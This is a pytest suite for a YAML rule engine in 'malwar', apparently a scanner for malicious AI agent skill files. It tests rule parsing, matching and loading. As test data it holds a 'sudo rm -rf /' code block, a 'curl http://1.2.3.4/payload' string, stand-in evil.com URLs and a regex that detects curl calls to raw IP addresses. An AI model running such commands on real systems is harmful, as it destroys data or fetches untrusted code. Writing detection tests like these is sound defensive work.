# Copyright (c) 2026 Veritas Aequitas Holdings LLC. All rights reserved.
"""Tests for the YAML-based custom rule authoring system."""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest
from pydantic import ValidationError

from malwar.core.constants import DetectorLayer, Severity, ThreatCategory
from malwar.detectors.rule_engine.registry import RuleRegistry
from malwar.detectors.rule_engine.yaml_loader import (
    load_yaml_rules_from_directory,
)
from malwar.detectors.rule_engine.yaml_rule import (
    MatchLogic,
    YamlRule,
    YamlRuleDefinition,
)
from malwar.models.finding import Finding
from malwar.models.skill import CodeBlock, SkillContent, SkillMetadata

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_skill(
    *,
    raw_content: str = "",
    name: str | None = None,
    author: str | None = None,
    description: str | None = None,
    tags: list[str] | None = None,
    urls: list[str] | None = None,
    code_blocks: list[CodeBlock] | None = None,
) -> SkillContent:
    return SkillContent(
        file_path="test_skill.md",
        raw_content=raw_content,
        metadata=SkillMetadata(
            name=name,
            author=author,
            description=description,
            tags=tags or [],
        ),
        urls=urls or [],
        code_blocks=code_blocks or [],
    )


def _make_definition(**overrides) -> YamlRuleDefinition:
    defaults = {
        "id": "TEST-001",
        "title": "Test rule",
        "description": "A test rule",
        "severity": "medium",
        "category": "suspicious_command",
        "confidence": 0.80,
        "patterns": [{"pattern": "test", "match_type": "contains", "target": "content"}],
    }
    defaults.update(overrides)
    return YamlRuleDefinition(**defaults)


# ---------------------------------------------------------------------------
# YAML rule definition parsing & validation
# ---------------------------------------------------------------------------


class TestYamlRuleDefinitionParsing:
    """Test that YAML definitions are correctly parsed into Pydantic models."""

    def test_minimal_definition(self):
        defn = _make_definition()
        assert defn.id == "TEST-001"
        assert defn.severity == Severity.MEDIUM
        assert defn.match == MatchLogic.ALL
        assert len(defn.patterns) == 1

    def test_all_fields_populated(self):
        defn = YamlRuleDefinition(
            id="FULL-001",
            title="Full rule",
            description="Fully specified rule",
            severity="critical",
            category="data_exfiltration",
            confidence=0.99,
            enabled=False,
            match="any",
            patterns=[
                {"pattern": "abc", "match_type": "exact", "target": "metadata.name"},
                {"pattern": "xyz", "match_type": "regex", "target": "urls"},
            ],
            evidence_template="Found ${pattern} in ${target}",
        )
        assert defn.severity == Severity.CRITICAL
        assert defn.category == ThreatCategory.DATA_EXFILTRATION
        assert defn.match == MatchLogic.ANY
        assert len(defn.patterns) == 2
        assert defn.enabled is False

    def test_invalid_severity_rejected(self):
        with pytest.raises(ValidationError):
            _make_definition(severity="nonexistent")

    def test_invalid_category_rejected(self):
        with pytest.raises(ValidationError):
            _make_definition(category="nonexistent_category")

    def test_empty_patterns_rejected(self):
        with pytest.raises(ValidationError):
            _make_definition(patterns=[])

    def test_empty_pattern_string_rejected(self):
        with pytest.raises(ValidationError):
            _make_definition(patterns=[{"pattern": "  ", "match_type": "contains", "target": "content"}])

    def test_empty_id_rejected(self):
        with pytest.raises(ValidationError):
            _make_definition(id="  ")

    def test_confidence_bounds(self):
        with pytest.raises(ValidationError):
            _make_definition(confidence=1.5)
        with pytest.raises(ValidationError):
            _make_definition(confidence=-0.1)

    def test_default_evidence_template(self):
        defn = _make_definition()
        assert "${rule_id}" in defn.evidence_template


# ---------------------------------------------------------------------------
# Match type tests
# ---------------------------------------------------------------------------


class TestMatchTypes:
    """Test each match_type against raw content."""

    def test_contains_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "hello world", "match_type": "contains", "target": "content"}],
        ))
        skill = _make_skill(raw_content="Say hello world today")
        findings = rule.check(skill)
        assert len(findings) == 1

    def test_contains_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "goodbye", "match_type": "contains", "target": "content"}],
        ))
        skill = _make_skill(raw_content="hello world")
        assert rule.check(skill) == []

    def test_exact_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "exact value", "match_type": "exact", "target": "metadata.name"}],
        ))
        skill = _make_skill(name="exact value")
        findings = rule.check(skill)
        assert len(findings) == 1

    def test_exact_no_match_partial(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "exact", "match_type": "exact", "target": "metadata.name"}],
        ))
        skill = _make_skill(name="exact value")
        assert rule.check(skill) == []

    def test_starts_with_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "http://evil", "match_type": "starts_with", "target": "urls"}],
        ))
        skill = _make_skill(urls=["http://evil.example.com/path"])
        findings = rule.check(skill)
        assert len(findings) == 1

    def test_starts_with_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "https://safe", "match_type": "starts_with", "target": "urls"}],
        ))
        skill = _make_skill(urls=["http://evil.example.com"])
        assert rule.check(skill) == []

    def test_ends_with_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": ".evil.com", "match_type": "ends_with", "target": "urls"}],
        ))
        skill = _make_skill(urls=["http://something.evil.com"])
        findings = rule.check(skill)
        assert len(findings) == 1

    def test_ends_with_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": ".safe.com", "match_type": "ends_with", "target": "urls"}],
        ))
        skill = _make_skill(urls=["http://evil.com"])
        assert rule.check(skill) == []

    def test_regex_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": r"curl\s+https?://\d+\.\d+\.\d+\.\d+", "match_type": "regex", "target": "content"}],
        ))
        skill = _make_skill(raw_content="run curl http://1.2.3.4/payload")
        findings = rule.check(skill)
        assert len(findings) == 1

    def test_regex_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": r"curl\s+https?://\d+\.\d+\.\d+\.\d+", "match_type": "regex", "target": "content"}],
        ))
        skill = _make_skill(raw_content="curl https://example.com")
        assert rule.check(skill) == []


# ---------------------------------------------------------------------------
# Target tests
# ---------------------------------------------------------------------------


class TestMatchTargets:
    """Test each target type extracts the right text."""

    def test_target_content(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "secret_payload", "match_type": "contains", "target": "content"}],
        ))
        skill = _make_skill(raw_content="This has a secret_payload hidden")
        assert len(rule.check(skill)) == 1

    def test_target_metadata_name(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "Evil Skill", "match_type": "exact", "target": "metadata.name"}],
        ))
        skill = _make_skill(name="Evil Skill")
        assert len(rule.check(skill)) == 1

    def test_target_metadata_author(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "bad_actor", "match_type": "contains", "target": "metadata.author"}],
        ))
        skill = _make_skill(author="bad_actor_42")
        assert len(rule.check(skill)) == 1

    def test_target_metadata_description(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "phishing", "match_type": "contains", "target": "metadata.description"}],
        ))
        skill = _make_skill(description="This is definitely not phishing")
        assert len(rule.check(skill)) == 1

    def test_target_metadata_tags(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "malware", "match_type": "exact", "target": "metadata.tags"}],
        ))
        skill = _make_skill(tags=["utility", "malware", "network"])
        assert len(rule.check(skill)) == 1

    def test_target_metadata_tags_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "malware", "match_type": "exact", "target": "metadata.tags"}],
        ))
        skill = _make_skill(tags=["safe", "network"])
        assert rule.check(skill) == []

    def test_target_urls(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "evil.com", "match_type": "contains", "target": "urls"}],
        ))
        skill = _make_skill(urls=["https://safe.com", "https://evil.com/payload"])
        assert len(rule.check(skill)) == 1

    def test_target_code_blocks(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": r"\bsudo\b", "match_type": "regex", "target": "code_blocks"}],
        ))
        skill = _make_skill(
            code_blocks=[
                CodeBlock(language="bash", content="sudo rm -rf /", line_start=5, line_end=5),
            ],
        )
        assert len(rule.check(skill)) == 1

    def test_target_code_blocks_no_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": r"\bsudo\b", "match_type": "regex", "target": "code_blocks"}],
        ))
        skill = _make_skill(
            code_blocks=[
                CodeBlock(language="python", content="print('hello')", line_start=1, line_end=1),
            ],
        )
        assert rule.check(skill) == []


# ---------------------------------------------------------------------------
# AND / OR logic tests
# ---------------------------------------------------------------------------


class TestMatchLogic:
    """Test the AND (all) and OR (any) pattern combination logic."""

    def test_and_logic_all_match(self):
        rule = YamlRule(_make_definition(
            match="all",
            patterns=[
                {"pattern": "alpha", "match_type": "contains", "target": "content"},
                {"pattern": "beta", "match_type": "contains", "target": "content"},
            ],
        ))
        skill = _make_skill(raw_content="alpha and beta are here")
        assert len(rule.check(skill)) == 1

    def test_and_logic_partial_match(self):
        rule = YamlRule(_make_definition(
            match="all",
            patterns=[
                {"pattern": "alpha", "match_type": "contains", "target": "content"},
                {"pattern": "gamma", "match_type": "contains", "target": "content"},
            ],
        ))
        skill = _make_skill(raw_content="only alpha is here")
        assert rule.check(skill) == []

    def test_or_logic_one_match(self):
        rule = YamlRule(_make_definition(
            match="any",
            patterns=[
                {"pattern": "alpha", "match_type": "contains", "target": "content"},
                {"pattern": "gamma", "match_type": "contains", "target": "content"},
            ],
        ))
        skill = _make_skill(raw_content="only alpha is here")
        assert len(rule.check(skill)) == 1

    def test_or_logic_no_match(self):
        rule = YamlRule(_make_definition(
            match="any",
            patterns=[
                {"pattern": "gamma", "match_type": "contains", "target": "content"},
                {"pattern": "delta", "match_type": "contains", "target": "content"},
            ],
        ))
        skill = _make_skill(raw_content="only alpha is here")
        assert rule.check(skill) == []

    def test_and_across_targets(self):
        """AND logic across different targets (content + metadata)."""
        rule = YamlRule(_make_definition(
            match="all",
            patterns=[
                {"pattern": "curl", "match_type": "contains", "target": "content"},
                {"pattern": "network", "match_type": "exact", "target": "metadata.tags"},
            ],
        ))
        skill = _make_skill(raw_content="curl http://example.com", tags=["network"])
        assert len(rule.check(skill)) == 1

    def test_and_across_targets_partial_fail(self):
        rule = YamlRule(_make_definition(
            match="all",
            patterns=[
                {"pattern": "curl", "match_type": "contains", "target": "content"},
                {"pattern": "network", "match_type": "exact", "target": "metadata.tags"},
            ],
        ))
        skill = _make_skill(raw_content="curl http://example.com", tags=["safe"])
        assert rule.check(skill) == []


# ---------------------------------------------------------------------------
# Finding structure tests
# ---------------------------------------------------------------------------


class TestFindingOutput:
    """Verify the structure of returned Finding objects."""

    def test_finding_fields(self):
        rule = YamlRule(_make_definition(
            id="FIND-001",
            title="Finding test",
            description="Desc",
            severity="high",
            category="data_exfiltration",
            confidence=0.92,
        ))
        skill = _make_skill(raw_content="test pattern inside content")
        findings = rule.check(skill)
        assert len(findings) == 1

        f = findings[0]
        assert isinstance(f, Finding)
        assert f.rule_id == "FIND-001"
        assert f.title == "Finding test"
        assert f.severity == Severity.HIGH
        assert f.category == ThreatCategory.DATA_EXFILTRATION
        assert f.confidence == 0.92
        assert f.detector_layer == DetectorLayer.RULE_ENGINE
        assert f.id == "FIND-001-YAML"

    def test_finding_has_location_for_content_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "line_two", "match_type": "contains", "target": "content"}],
        ))
        skill = _make_skill(raw_content="line_one\nline_two\nline_three")
        findings = rule.check(skill)
        assert len(findings) == 1
        assert findings[0].location is not None
        assert findings[0].location.line_start == 2

    def test_finding_no_location_for_metadata_match(self):
        rule = YamlRule(_make_definition(
            patterns=[{"pattern": "evil", "match_type": "contains", "target": "metadata.name"}],
        ))
        skill = _make_skill(name="evil skill")
        findings = rule.check(skill)
        assert len(findings) == 1
        assert findings[0].location is None


# ---------------------------------------------------------------------------
# Evidence template tests
# ---------------------------------------------------------------------------


class TestEvidenceTemplate:
    """Test that evidence_template is rendered correctly."""

    def test_default_template(self):
        rule = YamlRule(_make_definition(id="TPL-001"))
        skill = _make_skill(raw_content="test content")
        findings = rule.check(skill)
        assert any("TPL-001" in e for e in findings[0].evidence)

    def test_custom_template(self):
        rule = YamlRule(_make_definition(
            evidence_template="Found '${pattern}' via ${match_type} in ${target}",
            patterns=[{"pattern": "danger", "match_type": "contains", "target": "content"}],
        ))
        skill = _make_skill(raw_content="this is danger zone")
        findings = rule.check(skill)
        assert len(findings) == 1
        evidence = findings[0].evidence[0]
        assert "danger" in evidence
        assert "contains" in evidence
        assert "content" in evidence

    def test_template_with_value_substitution(self):
        rule = YamlRule(_make_definition(
            evidence_template="Matched value=${value}",
            patterns=[{"pattern": r"secret_\w+", "match_type": "regex", "target": "content"}],
        ))
        skill = _make_skill(raw_content="found secret_key here")
        findings = rule.check(skill)
        assert len(findings) == 1
        assert "secret_key" in findings[0].evidence[0]


# ---------------------------------------------------------------------------
# YAML file loading tests
# ---------------------------------------------------------------------------


class TestYamlLoader:
    """Test loading YAML rule files from disk."""

    def setup_method(self):
        """Clear the registry before each test, saving original state."""
        self._saved_rules = dict(RuleRegistry._rules)
        RuleRegistry.clear()

    def teardown_method(self):
        """Restore the registry after each test."""
        RuleRegistry._rules.update(self._saved_rules)

    def test_load_valid_rule_file(self, tmp_path: Path):
        rule_file = tmp_path / "test_rule.yml"
        rule_file.write_text(textwrap.dedent("""\
            id: LOAD-001
            title: Loaded rule
            description: A loaded rule
            severity: low
            category: suspicious_command
            confidence: 0.75
            patterns:
              - pattern: "blocked_word"
                match_type: contains
                target: content
        """))

        rules = load_yaml_rules_from_directory(tmp_path)
        assert len(rules) == 1
        assert rules[0].rule_id == "LOAD-001"

    def test_load_yaml_extension(self, tmp_path: Path):
        rule_file = tmp_path / "rule.yaml"
        rule_file.write_text(textwrap.dedent("""\
            id: LOAD-002
            title: YAML extension
            severity: info
            category: suspicious_command
            patterns:
              - pattern: "test"
                match_type: contains
                target: content
        """))

        rules = load_yaml_rules_from_directory(tmp_path)
        assert len(rules) == 1

    def test_load_multiple_files(self, tmp_path: Path):
        for i in range(3):
            (tmp_path / f"rule_{i}.yml").write_text(textwrap.dedent(f"""\
                id: MULTI-{i:03d}
                title: Rule {i}
                severity: medium
                category: suspicious_command
                patterns:
                  - pattern: "pattern_{i}"
                    match_type: contains
                    target: content
            """))

        rules = load_yaml_rules_from_directory(tmp_path)
        assert len(rules) == 3

    def test_invalid_yaml_syntax_skipped(self, tmp_path: Path):
        bad = tmp_path / "bad.yml"
        bad.write_text("id: TEST\n  invalid: [yaml: syntax")

        good = tmp_path / "good.yml"
        good.write_text(textwrap.dedent("""\
            id: GOOD-001
            title: Valid rule
            severity: low
            category: suspicious_command
            patterns:
              - pattern: test
                match_type: contains
                target: content
        """))

        rules = load_yaml_rules_from_directory(tmp_path)
        assert len(rules) == 1
        assert rules[0].rule_id == "GOOD-001"

    def test_invalid_schema_skipped(self, tmp_path: Path):
        bad = tmp_path / "bad_schema.yml"
        bad.write_text(textwrap.dedent("""\
            id: BAD-001
            title: Missing patterns
            severity: low
            category: suspicious_command
        """))

        good = tmp_path / "good.yml"
        good.write_text(textwrap.dedent("""\
            id: GOOD-002
            title: Valid
            severity: low
            category: suspicious_command
            patterns:
              - pattern: ok
                match_type: contains
                target: content
        """))

        rules = load_yaml_rules_from_directory(tmp_path)
        assert len(rules) == 1
        assert rules[0].rule_id == "GOOD-002"

    def test_nonexistent_directory(self, tmp_path: Path):
        rules = load_yaml_rules_from_directory(tmp_path / "does_not_exist")
        assert rules == []

    def test_empty_directory(self, tmp_path: Path):
        rules = load_yaml_rules_from_directory(tmp_path)
        assert rules == []

    def test_non_mapping_yaml_skipped(self, tmp_path: Path):
        bad = tmp_path / "list.yml"
        bad.write_text("- item1\n- item2\n")

        rules = load_yaml_rules_from_directory(tmp_path)
        assert rules == []


# ---------------------------------------------------------------------------
# Registry integration tests
# ---------------------------------------------------------------------------


class TestRegistryIntegration:
    """Verify that loaded YAML rules integrate with RuleRegistry."""

    def setup_method(self):
        self._saved_rules = dict(RuleRegistry._rules)
        RuleRegistry.clear()

    def teardown_method(self):
        RuleRegistry._rules.update(self._saved_rules)

    def test_loaded_rules_appear_in_registry(self, tmp_path: Path):
        rule_file = tmp_path / "reg_rule.yml"
        rule_file.write_text(textwrap.dedent("""\
            id: REG-001
            title: Registry test
            severity: medium
            category: suspicious_command
            patterns:
              - pattern: "test"
                match_type: contains
                target: content
        """))

        load_yaml_rules_from_directory(tmp_path)

        all_rules = RuleRegistry.get_all()
        rule_ids = [r.rule_id for r in all_rules]
        assert "REG-001" in rule_ids

    def test_get_enabled_includes_yaml_rules(self, tmp_path: Path):
        rule_file = tmp_path / "enabled.yml"
        rule_file.write_text(textwrap.dedent("""\
            id: EN-001
            title: Enabled rule
            severity: low
            category: suspicious_command
            enabled: true
            patterns:
              - pattern: "test"
                match_type: contains
                target: content
        """))

        load_yaml_rules_from_directory(tmp_path)

        enabled = RuleRegistry.get_enabled()
        rule_ids = [r.rule_id for r in enabled]
        assert "EN-001" in rule_ids

    def test_disabled_yaml_rule_excluded(self, tmp_path: Path):
        rule_file = tmp_path / "disabled.yml"
        rule_file.write_text(textwrap.dedent("""\
            id: DIS-001
            title: Disabled rule
            severity: low
            category: suspicious_command
            enabled: false
            patterns:
              - pattern: "test"
                match_type: contains
                target: content
        """))

        load_yaml_rules_from_directory(tmp_path)

        enabled = RuleRegistry.get_enabled()
        rule_ids = [r.rule_id for r in enabled]
        assert "DIS-001" not in rule_ids

    def test_yaml_rules_can_run_via_registry(self, tmp_path: Path):
        rule_file = tmp_path / "runnable.yml"
        rule_file.write_text(textwrap.dedent("""\
            id: RUN-001
            title: Runnable
            severity: high
            category: suspicious_command
            patterns:
              - pattern: "malicious_payload"
                match_type: contains
                target: content
        """))

        load_yaml_rules_from_directory(tmp_path)

        skill = _make_skill(raw_content="This contains malicious_payload data")

        enabled = RuleRegistry.get_enabled()
        all_findings: list[Finding] = []
        for rule_instance in enabled:
            all_findings.extend(rule_instance.check(skill))

        matching = [f for f in all_findings if f.rule_id == "RUN-001"]
        assert len(matching) == 1
